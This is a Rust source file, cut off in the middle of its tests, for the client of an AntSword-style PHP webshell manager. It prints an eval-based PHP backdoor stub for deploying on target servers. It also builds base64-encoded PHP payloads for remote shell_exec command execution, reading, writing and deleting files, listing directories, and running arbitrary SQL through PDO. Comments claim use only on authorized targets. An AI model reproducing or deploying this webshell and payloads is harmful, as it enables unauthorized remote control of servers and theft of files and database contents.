//! 标准 PHP WebShell 协议（类蚁剑风格）。
//!
//! 服务端 stub 由用户自行部署到授权目标：
//! ```php
//! <?php @eval(base64_decode($_POST['x']));
//! ```
//! 客户端每次操作生成一段 PHP 代码，base64 后经 POST 参数 `x` 发送；
//! 代码将结果包裹在随机 `nonce` 帧内输出，客户端按 nonce 定位解析。
//! 所有路径 / 命令参数均以 base64 字面量嵌入代码，规避引号与转义问题。
//!
//! 本协议只生成白名单模板，不提供任意 PHP 代码透传入口。

use std::any::Any;
use std::collections::VecDeque;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::{LazyLock, Mutex};
use std::time::Instant;

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use serde_json::Value;

use crate::domain::{
    AppSettings, CommandOutput, DbConnection, DbProbeResult, DbQueryResult, DirListing, FileEntry,
    ProbeResult, RequestRecord, ShellProfile,
};

use super::transport::build_client;
use super::{Protocol, ProtocolError, SessionState};

pub const PHP_PROTOCOL_ID: &str = "builtin.php.v1";

/// PHP 协议的会话状态：持有专用 HTTP 客户端（每会话独立，避免跨会话并发干扰）。
pub struct PhpSession {
    pub endpoint: String,
    pub password: String,
    pub client: reqwest::blocking::Client,
}

impl SessionState for PhpSession {
    fn as_any(&self) -> &dyn Any {
        self
    }
}

/// PHP 协议实例（无状态单例）。
pub struct PhpProtocol;

/// 服务端代码模板的前缀：静默错误 + 鉴权。
/// 所有操作代码都拼接在它之后，并以 `{NONCE}` 帧收尾。
const TEMPLATE_PREFIX: &str = r#"@ini_set("display_errors","0");@error_reporting(0);@set_time_limit(0);if(@$_POST['k']!=='{PWD}'){die('AUTH_FAIL');}"#;

/// 每个操作的公共收尾：输出 nonce 帧。
/// 调用方应把业务结果写入 `$__r`（PHP 数组），本段负责序列化输出。
const TEMPLATE_FRAME: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;

/// 错误分支的收尾：先输出错误帧再终止，保证客户端能解析到业务错误。
const TEMPLATE_FRAME_DIE: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';die;"#;

/// 数据库驱动白名单（Rust 侧校验，防止任意 DSN 注入）。
const DB_DRIVERS: [&str; 3] = ["mysql", "pgsql", "sqlite"];

/// 数据库探测载荷：PDO 连接 + 列出数据库。
/// 占位符：{PWD} {DSN} {USER} {PASS} {LIST_DBS} {DBNAME} {DRIVER}
const DB_PROBE_CODE: &str = r#"@ini_set("display_errors","0");@error_reporting(0);if(@$_POST['k']!=='{PWD}'){die('AUTH_FAIL');}
$dsn=base64_decode('{DSN}');$u=base64_decode('{USER}');$w=base64_decode('{PASS}');
try{$dbh=new PDO($dsn,$u,$w,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
$q=base64_decode('{LIST_DBS}');
if($q===''){$dbs=array(base64_decode('{DBNAME}'));}else{$dbs=array();foreach($dbh->query($q) as $r){$dbs[]=$r[0];}}
$__r=array('ok'=>true,'data'=>array('driver'=>'{DRIVER}','databases'=>$dbs));
}catch(Exception $e){$__r=array('ok'=>false,'error'=>'数据库连接失败：'.$e->getMessage());}
echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;

/// 数据库查询载荷：连接 + 执行 SQL + 结果（查询返回列与行，非查询返回影响行数）。
/// 占位符：{PWD} {DSN} {USER} {PASS} {SQL}
const DB_QUERY_CODE: &str = r#"@ini_set("display_errors","0");@error_reporting(0);if(@$_POST['k']!=='{PWD}'){die('AUTH_FAIL');}
$dsn=base64_decode('{DSN}');$u=base64_decode('{USER}');$w=base64_decode('{PASS}');
try{$dbh=new PDO($dsn,$u,$w,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
$sql=base64_decode('{SQL}');
$stmt=$dbh->query($sql);
if($stmt===false){$__r=array('ok'=>false,'error'=>'SQL 执行失败');}
elseif(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with)\b/i',$sql)){
$cols=array();$n=$stmt->columnCount();for($i=0;$i<$n;$i++){$m=$stmt->getColumnMeta($i);$cols[]=(isset($m['name'])&&$m['name']!=='')?$m['name']:('col'.$i);}
$rows=array();$cnt=0;
while(($r=$stmt->fetch(PDO::FETCH_NUM))!==false&&$cnt<1000){$row=array();foreach($r as $v){$row[]=($v===null)?null:(string)$v;}$rows[]=$row;$cnt++;}
$__r=array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0));
}else{$__r=array('ok'=>true,'data'=>array('columns'=>array(),'rows'=>array(),'affected'=>$stmt->rowCount()));}
}catch(Exception $e){$__r=array('ok'=>false,'error'=>'数据库操作失败：'.$e->getMessage());}
echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;

// ---------------------------------------------------------------------------
// 请求调试：进程内环缓冲，记录每条协议帧（载荷 / 响应），供「请求调试」页查看。
// 仅调试用途，不落盘；密码在载荷预览中脱敏。
// ---------------------------------------------------------------------------

/// 载荷 / 响应预览截断长度。
const DEBUG_PREVIEW_LEN: usize = 2048;
/// 环缓冲容量。
const DEBUG_LOG_CAP: usize = 200;

static REQUEST_LOG: LazyLock<Mutex<VecDeque<RequestRecord>>> =
    LazyLock::new(|| Mutex::new(VecDeque::with_capacity(DEBUG_LOG_CAP)));
static REQUEST_COUNTER: AtomicU64 = AtomicU64::new(0);

/// 记录一条协议请求（由 send_frame 调用）。
fn record_request(
    action: &str,
    endpoint: &str,
    status: u16,
    duration_ms: u64,
    code: &str,
    response: &str,
    password: &str,
) {
    // 载荷脱敏：密码字面量替换为 ***（密码为空时跳过，避免 replace("") 异常）
    let payload = if password.is_empty() {
        code.to_string()
    } else {
        code.replace(password, "***")
    };
    let mut record = RequestRecord {
        id: REQUEST_COUNTER.fetch_add(1, Ordering::Relaxed),
        endpoint: endpoint.to_string(),
        action: action.to_string(),
        created_at: chrono::Utc::now().to_rfc3339(),
        status,
        duration_ms,
        payload: truncate(&payload),
        response: truncate(response),
    };
    // 响应里可能残留明文密码（如 AUTH_FAIL 回显外的场景），一并脱敏
    record.response = if password.is_empty() {
        record.response
    } else {
        record.response.replace(password, "***")
    };
    let mut log = REQUEST_LOG.lock().expect("请求日志锁异常");
    if log.len() >= DEBUG_LOG_CAP {
        log.pop_front();
    }
    log.push_back(record);
}

fn truncate(value: &str) -> String {
    let mut chars = value.chars();
    let head: String = chars.by_ref().take(DEBUG_PREVIEW_LEN).collect();
    if chars.next().is_some() {
        format!("{head}\n…（已截断）")
    } else {
        head
    }
}

/// 列出请求记录（可选按端点过滤），新记录在前。
pub fn list_requests(endpoint: Option<&str>) -> Vec<RequestRecord> {
    let log = REQUEST_LOG.lock().expect("请求日志锁异常");
    log.iter()
        .rev()
        .filter(|record| endpoint.map_or(true, |target| record.endpoint == target))
        .cloned()
        .collect()
}

/// 清空请求记录。
pub fn clear_requests() {
    REQUEST_LOG.lock().expect("请求日志锁异常").clear();
}

impl PhpProtocol {
    /// 将 `params` 逐项替换进模板的 `{key}` 占位符。
    fn build_code(template: &str, params: &[(&str, &str)]) -> String {
        let mut code = template.to_string();
        for (key, value) in params {
            code = code.replace(&format!("{{{key}}}"), value);
        }
        code
    }

    /// 发送一次协议请求并解析 nonce 帧，返回业务 JSON 值。
    ///
    /// 帧协议：调用方生成的 `code` 中必须包含 `echo '{nonce}';`（nonce 由本方法
    /// 随机生成并替换 `{NONCE}` 占位符），服务器会原样回显该 nonce，响应中
    /// 两个 nonce 之间的部分即协议帧。
    fn send_frame(
        &self,
        client: &reqwest::blocking::Client,
        endpoint: &str,
        password: &str,
        code_template: &str,
        settings: &AppSettings,
        action: &str,
    ) -> Result<Value, ProtocolError> {
        // 8 字节随机 nonce（hex 字符串）
        let nonce = random_nonce();
        let start = Instant::now();
        let code = code_template.replace("{NONCE}", &nonce);

        let body = url::form_urlencoded::Serializer::new(String::new())
            .append_pair("k", password)
            .append_pair("x", &B64.encode(&code))
            .finish();

        let response = client
            .post(endpoint)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(body)
            .send()
            .map_err(|error| ProtocolError::Network(error.to_string()))?;

        let status = response.status();
        let duration_ms = start.elapsed().as_millis() as u64;

        if !status.is_success() {
            return Err(ProtocolError::HttpStatus(
                status.as_u16(),
                status.canonical_reason().unwrap_or("").to_string(),
            ));
        }

        let bytes = response
            .bytes()
            .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
        let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
        if bytes.len() > max_bytes as usize {
            return Err(ProtocolError::ParseError(format!(
                "响应超过大小上限（{}MB）",
                settings.max_file_size_mb
            )));
        }
        let text = String::from_utf8_lossy(&bytes);

        // 调试记录（先于错误分支，失败请求同样留痕）
        record_request(
            action,
            endpoint,
            status.as_u16(),
            duration_ms,
            &code,
            &text,
            password,
        );

        // 鉴权失败时服务器直接输出明文 AUTH_FAIL（无帧）
        if text.contains("AUTH_FAIL") {
            return Err(ProtocolError::AuthFailed(
                "密码错误，服务器拒绝鉴权".to_string(),
            ));
        }

        // 按 nonce 帧定位响应体（帧外杂散输出天然免疫）
        let start = text.find(&nonce).ok_or_else(|| {
            ProtocolError::ParseError(
                "响应中未找到协议帧（请确认目标运行的是标准 PHP 协议 stub）".to_string(),
            )
        })?;
        let tail = &text[start + nonce.len()..];
        let end = tail.find(&nonce).ok_or(ProtocolError::ParseError(
            "协议帧不完整（响应被截断）".to_string(),
        ))?;
        let payload = &tail[..end];

        let decoded = B64
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("帧内容不是合法 Base64".to_string()))?;
        let value: Value = serde_json::from_slice(&decoded)
            .map_err(|_| ProtocolError::ParseError("帧内容不是合法 JSON".to_string()))?;

        if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
            let error = value
                .get("error")
                .and_then(|v| v.as_str())
                .unwrap_or("未知错误")
                .to_string();
            return Err(ProtocolError::ServerError(error));
        }

        Ok(value)
    }
}

/// 8 字节真随机 nonce（hex 字符串），用于帧定位与防注入。
fn random_nonce() -> String {
    let mut bytes = [0u8; 8];
    // 随机源失败时退化为时间戳低位，仍能保证帧唯一性（仅防注入强度降低）
    if getrandom::fill(&mut bytes).is_err() {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|duration| duration.subsec_nanos())
            .unwrap_or(0);
        bytes = (nanos as u64).to_le_bytes();
    }
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

/// 将 unix 时间戳格式化为本地时间的 `YYYY-MM-DD HH:MM`。
fn format_timestamp(ts: i64) -> String {
    use chrono::{DateTime, Local};
    DateTime::from_timestamp(ts, 0)
        .map(|datetime| datetime.with_timezone(&Local).format("%Y-%m-%d %H:%M").to_string())
        .unwrap_or_default()
}

impl Protocol for PhpProtocol {
    fn id(&self) -> &'static str {
        PHP_PROTOCOL_ID
    }

    fn display_name(&self) -> &'static str {
        "标准 PHP WebShell（类蚁剑）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        // 环境信息探测：不产生任何文件系统副作用
        let code = format!(
            "{}\n$__r=array('ok'=>true,'data'=>array('server'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>getcwd(),'separator'=>DIRECTORY_SEPARATOR));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &profile.password)]),
            TEMPLATE_FRAME
        );
        let client = build_client(settings);
        let value = self.send_frame(&client, &profile.endpoint, &profile.password, &code, settings, "probe")?;

        let server = value
            .pointer("/data/server")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let web_server = value
            .pointer("/data/web_server")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let runtime = value
            .pointer("/data/php_version")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let current_dir = value
            .pointer("/data/current_dir")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let separator = value
            .pointer("/data/separator")
            .and_then(|v| v.as_str())
            .unwrap_or("/")
            .to_string();

        Ok(ProbeResult {
            status: "online".to_string(),
            server,
            web_server,
            runtime,
            current_dir,
            separator,
            message: "PHP 协议探测成功，返回真实环境信息。".to_string(),
        })
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        // 先探测验证密码与连通性，再建立会话
        let result = self.probe(profile, settings)?;
        let session: Box<dyn SessionState> = Box::new(PhpSession {
            endpoint: profile.endpoint.clone(),
            password: profile.password.clone(),
            client: build_client(settings),
        });
        Ok((session, result))
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let cmd_b64 = B64.encode(command.as_bytes());
        let code = format!(
            "{}\n$c=base64_decode('{cmd_b64}');$o=@shell_exec($c.' 2>&1');$__r=array('ok'=>true,'data'=>array('stdout'=>base64_encode((string)$o),'cwd'=>getcwd()));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME
        );
        let start = Instant::now();
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "exec")?;
        let duration_ms = start.elapsed().as_millis() as u64;

        let stdout = value
            .pointer("/data/stdout")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .and_then(|bytes| String::from_utf8(bytes).ok())
            .unwrap_or_default();
        let cwd = value
            .pointer("/data/cwd")
            .and_then(|v| v.as_str())
            .map(str::to_string);

        Ok(CommandOutput { stdout, duration_ms, cwd })
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=@scandir($p);if($d===false){{$__r=array('ok'=>false,'error'=>'无法读取目录');{} }}$out=array();foreach($d as $f){{if($f==='.'||$f==='..')continue;$full=$p.DIRECTORY_SEPARATOR.$f;$is_dir=is_dir($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$is_dir,'size'=>$is_dir?0:filesize($full),'mtime'=>filemtime($full));}}$__r=array('ok'=>true,'data'=>array('entries'=>$out));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "list_dir")?;

        let entries: Vec<FileEntry> = value
            .pointer("/data/entries")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|item| FileEntry {
                        name: item.get("name").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                        path: item.get("path").and_then(|v| v.as_str()).unwrap_or("").to_string(),
                        is_dir: item.get("is_dir").and_then(|v| v.as_bool()).unwrap_or(false),
                        size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                        modified: item
                            .get("mtime")
                            .and_then(|v| v.as_i64())
                            .map(format_timestamp)
                            .unwrap_or_default(),
                    })
                    .collect()
            })
            .unwrap_or_default();

        Ok(DirListing { entries })
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$c=@file_get_contents($p);if($c===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}$__r=array('ok'=>true,'data'=>base64_encode($c));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "read_file")?;

        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let data_b64 = B64.encode(content);
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=base64_decode('{data_b64}');$r=@file_put_contents($p,$d);if($r===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>$r));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "write_file")?;
        Ok(())
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');if(is_dir($p)){{$r=@rmdir($p);}}else{{$r=@unlink($p);}}if($r===false){{$__r=array('ok'=>false,'error'=>'删除失败（目录非空或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "delete")?;
        Ok(())
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let from_b64 = B64.encode(from.as_bytes());
        let to_b64 = B64.encode(to.as_bytes());
        let code = format!(
            "{}\n$f=base64_decode('{from_b64}');$t=base64_decode('{to_b64}');$r=@rename($f,$t);if($r===false){{$__r=array('ok'=>false,'error'=>'重命名失败');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "rename")?;
        Ok(())
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$r=@mkdir($p,0755,true);if($r===false){{$__r=array('ok'=>false,'error'=>'创建目录失败（权限不足或已存在）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "mkdir")?;
        Ok(())
    }

    fn read_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        offset: u64,
        length: u64,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$off={off};$len={len};$f=@fopen($p,'rb');if($f===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}\nif($off>0){{@fseek($f,$off);}}$c=($len>0)?@fread($f,$len):@stream_get_contents($f);@fclose($f);$__r=array('ok'=>true,'data'=>base64_encode((string)$c));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME,
            off = offset,
            len = length,
        );
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "read_chunk")?;
        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn write_chunk(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        offset: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let path_b64 = B64.encode(path.as_bytes());
        let data_b64 = B64.encode(content);
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=base64_decode('{data_b64}');$off={off};$mode=($off>0&&@file_exists($p))?'r+b':'w+b';$f=@fopen($p,$mode);if($f===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}\n$ok=(@fseek($f,$off)>=0);if($ok){{@fwrite($f,$d);}}@fclose($f);if(!$ok){{$__r=array('ok'=>false,'error'=>'写入文件失败（偏移无效）');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>strlen($d)));{}",
            Self::build_code(TEMPLATE_PREFIX, &[("PWD", &php.password)]),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME,
            off = offset,
        );
        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "write_chunk")?;
        Ok(())
    }

    fn db_probe(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let driver = connection.driver.clone();
        let dsn = build_dsn(connection, false)?;
        let list_dbs = match driver.as_str() {
            "mysql" => "SHOW DATABASES".to_string(),
            "pgsql" => "SELECT datname FROM pg_database".to_string(),
            _ => String::new(),
        };
        let code = Self::build_code(
            DB_PROBE_CODE,
            &[
                ("PWD", &php.password),
                ("DSN", &B64.encode(dsn.as_bytes())),
                ("USER", &B64.encode(conn_user(connection))),
                ("PASS", &B64.encode(conn_pass(connection))),
                ("LIST_DBS", &B64.encode(list_dbs.as_bytes())),
                ("DBNAME", &B64.encode(conn_dbname(connection))),
                ("DRIVER", &driver),
            ],
        );
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "db_probe")?;
        let databases = value
            .pointer("/data/databases")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        Ok(DbProbeResult {
            driver,
            databases,
            message: "数据库连接成功".to_string(),
        })
    }

    fn db_query(
        &self,
        session: &dyn SessionState,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .expect("会话类型不匹配");
        let dsn = build_dsn(connection, true)?;
        let code = Self::build_code(
            DB_QUERY_CODE,
            &[
                ("PWD", &php.password),
                ("DSN", &B64.encode(dsn.as_bytes())),
                ("USER", &B64.encode(conn_user(connection))),
                ("PASS", &B64.encode(conn_pass(connection))),
                ("SQL", &B64.encode(sql.as_bytes())),
            ],
        );
        let start = Instant::now();
        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "db_query")?;
        let duration_ms = start.elapsed().as_millis() as u64;

        let columns = value
            .pointer("/data/columns")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        let rows = value
            .pointer("/data/rows")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|row| {
                        row.as_array()
                            .map(|cells| {
                                cells
                                    .iter()
                                    .map(|cell| {
                                        if cell.is_null() {
                                            None
                                        } else {
                                            Some(cell.as_str().unwrap_or("").to_string())
                                        }
                                    })
                                    .collect()
                            })
                            .unwrap_or_default()
                    })
                    .collect()
            })
            .unwrap_or_default();
        let affected = value
            .pointer("/data/affected")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);

        Ok(DbQueryResult {
            columns,
            rows,
            affected,
            duration_ms,
        })
    }
}

/// 校验驱动白名单并构造 PDO DSN。
/// `use_db` 为 true 时把 dbname 并入 DSN（查询语句需要选定数据库）。
fn build_dsn(connection: &DbConnection, use_db: bool) -> Result<String, ProtocolError> {
    if !DB_DRIVERS.contains(&connection.driver.as_str()) {
        return Err(ProtocolError::NotSupported(format!(
            "不支持的数据库驱动：{}（支持 mysql / pgsql / sqlite）",
            connection.driver
        )));
    }
    let host = connection.host.as_deref().unwrap_or("");
    let port = connection.port.unwrap_or_else(|| {
        if connection.driver == "pgsql" { 5432 } else { 3306 }
    });
    let dbname = connection.dbname.as_deref().unwrap_or("");
    match connection.driver.as_str() {
        "sqlite" => {
            if dbname.is_empty() {
                return Err(ProtocolError::ServerError(
                    "SQLite 模式需要在「数据库」字段填写目标文件路径".into(),
                ));
            }
            Ok(format!("sqlite:{dbname}"))
        }
        "mysql" => {
            let mut dsn = format!("mysql:host={host};port={port};charset=utf8mb4");
            if use_db && !dbname.is_empty() {
                dsn.push_str(&format!(";dbname={dbname}"));
            }
            Ok(dsn)
        }
        _ => {
            let db = if dbname.is_empty() { "postgres" } else { dbname };
            Ok(format!("pgsql:host={host};port={port};dbname={db}"))
        }
    }
}

fn conn_user(connection: &DbConnection) -> String {
    connection.username.as_deref().unwrap_or("").to_string()
}

fn conn_pass(connection: &DbConnection) -> String {
    connection.password.as_deref().unwrap_or("").to_string()
}

fn conn_dbname(connection: &DbConnection) -> String {
    connection.dbname.as_deref().unwrap_or("").to_string()
}

// ---------------------------------------------------------------------------
// 测试
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    use serde_json::json;

    use super::*;
    use crate::domain::ShellProfile;

    fn settings() -> AppSettings {
        AppSettings {
            http_enabled: true,
            default_timeout_secs: 5,
            proxy: None,
            max_file_size_mb: 32,
        }
    }

    fn profile(endpoint: &str) -> ShellProfile {
        ShellProfile {
            id: "test".into(),
            workspace_id: "ws".into(),
            name: "t".into(),
            endpoint: endpoint.into(),
            runtime: "php".into(),
            protocol_id: PHP_PROTOCOL_ID.into(),
            status: "unknown".into(),
            last_connected_at: None,
            created_at: "2026-01-01".into(),
            password: "secret".into(),
            protocol_params: "{}".into(),
            authorization_ack: true,
            tags: vec![],
        }
    }

    /// 起一个假 PHP 服务器：解析收到的 `k`/`x` 参数，把 (code, k) 通过 channel 上报，
    /// 从代码中提取 nonce，然后用传入的 `respond` 生成 JSON data 包裹进该 nonce 帧回送
    /// （模拟真实 stub 的 echo 行为）。若 `respond` 返回 `None`，则回送明文 AUTH_FAIL。
    fn spawn_fake_server(
        respond: impl Fn(String, String) -> Option<Value> + Send + 'static,
    ) -> (String, std::sync::mpsc::Receiver<(String, String)>) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut stream) = stream else { continue };
                let mut buf = Vec::new();
                let mut temp = [0u8; 8192];
                loop {
                    match stream.read(&mut temp) {
                        Ok(0) => break,
                        Ok(n) => {
                            buf.extend_from_slice(&temp[..n]);
                            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                        }
                        Err(_) => break,
                    }
                }
                let request = String::from_utf8_lossy(&buf);
                let body_start = request.find("\r\n\r\n").map(|i| i + 4).unwrap_or(request.len());
                let body = &request[body_start.min(request.len())..];

                let params: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
                    .map(|(k, v)| (k.into_owned(), v.into_owned()))
                    .collect();
                let k = params
                    .iter()
                    .find(|(key, _)| key == "k")
                    .map(|(_, v)| v.clone())
                    .unwrap_or_default();
                let x = params
                    .iter()
                    .find(|(key, _)| key == "x")
                    .map(|(_, v)| v.clone())
                    .unwrap_or_default();
                let code = String::from_utf8(B64.decode(&x).unwrap_or_default()).unwrap_or_default();
                let _ = tx.send((k.clone(), code.clone()));

                // 从代码中提取 `echo '{nonce}'` 帧标记
                let nonce = code
                    .split("echo '")
                    .nth(1)
                    .and_then(|part| part.split('\'').next())
                    .unwrap_or("abababab")
                    .to_string();

                let body = match respond(code, k) {
                    Some(data) => {
                        format!("{}{}{}", nonce, B64.encode(json!(data).to_string()), nonce)
                    }
                    None => "AUTH_FAIL".to_string(),
                };
                let response = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = stream.write_all(response.as_bytes());
                let _ = stream.flush();
            }
        });
        (format!("http://{addr}"), rx)
    }

    #[test]
    fn probe_round_trip_with_fake_server() {
        let (url, rx) = spawn_fake_server(|_code, _k| {
            Some(json!({"ok": true, "data": {"server": "Linux fake", "web_server": "Apache", "php_version": "8.2.0"}}))
        });
        let proto = PhpProtocol;
